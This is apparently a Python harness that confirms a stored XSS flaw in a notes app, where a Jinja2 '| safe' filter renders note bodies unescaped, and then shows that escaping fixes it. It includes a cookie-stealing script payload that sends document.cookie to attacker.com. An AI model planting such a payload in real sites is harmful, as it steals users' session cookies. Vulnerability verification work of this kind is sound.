#!/usr/bin/env python3
"""Harness: Verify stored XSS via Jinja2 | safe filter in notes.html:18.

Simulates the source→sink chain:
  1. POST /api/notes (no auth) → create_note() → SQLite INSERT (body stored verbatim)
  2. GET /notes → render_template("notes.html") → {{ n.body | safe }} (unescaped output)
"""
import argparse
import html
import sqlite3

MSGS = {
    "created": ("Note created id=", "已创建备忘录 id="),
    "vuln_html": ("Rendered HTML with | safe:", "使用 | safe 渲染的 HTML:"),
    "ok": ("XSS payload rendered unescaped.", "XSS 载荷未经转义即被渲染。"),
    "miss": ("XSS payload was escaped (not vulnerable).", "XSS 载荷已被转义（未命中）。"),
    "fixed": ("Without | safe, payload is HTML-escaped:", "去掉 | safe 后载荷被 HTML 转义:"),
}


def msg(key: str, zh: bool) -> str:
    en, zh_s = MSGS[key]
    return zh_s if zh else en


def create_note(conn, *, author, title, body):
    """Mirrors src/board/store.py create_note (parameterized INSERT)."""
    cur = conn.execute(
        "INSERT INTO notes(author, title, body) VALUES (?, ?, ?)",
        (author, title, body),
    )
    conn.commit()
    return int(cur.lastrowid)


def list_notes(conn):
    """Mirrors src/board/store.py list_notes."""
    rows = conn.execute(
        "SELECT id, author, title, body FROM notes ORDER BY id DESC"
    ).fetchall()
    return [dict(r) for r in rows]


def render_notes(notes, use_safe=True):
    """Simulate Jinja2 rendering of notes.html."""
    parts = ["<!doctype html><html><body>"]
    for n in notes:
        body_content = n["body"] if use_safe else html.escape(n["body"])
        parts.append(
            f'<article><h2>{html.escape(n["title"])}</h2>'
            f'<p class="meta">#{n["id"]} · {html.escape(n["author"])}</p>'
            f'<div class="body">{body_content}</div></article>'
        )
    parts.append("</body></html>")
    return "".join(parts)


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard stored XSS harness")
    p.add_argument("--zh", action="store_true", help="Print labels in Chinese (default: English)")
    args = p.parse_args()
    zh = args.zh

    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    conn.execute(
        "CREATE TABLE notes (id INTEGER PRIMARY KEY, author TEXT, title TEXT, body TEXT)"
    )

    xss_payload = '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
    note_id = create_note(conn, author="attacker", title="xss-test", body=xss_payload)
    print(f"{msg('created', zh)}{note_id} payload={xss_payload}")
    create_note(conn, author="alice", title="welcome", body="Ship the Q3 memo.")

    notes = list_notes(conn)
    html_vulnerable = render_notes(notes, use_safe=True)
    print(msg("vuln_html", zh))
    print(html_vulnerable)

    if xss_payload not in html_vulnerable:
        print(msg("miss", zh))
        return 1
    print(msg("ok", zh))

    html_fixed = render_notes(notes, use_safe=False)
    print(msg("fixed", zh))
    print(html_fixed)
    if xss_payload in html_fixed:
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
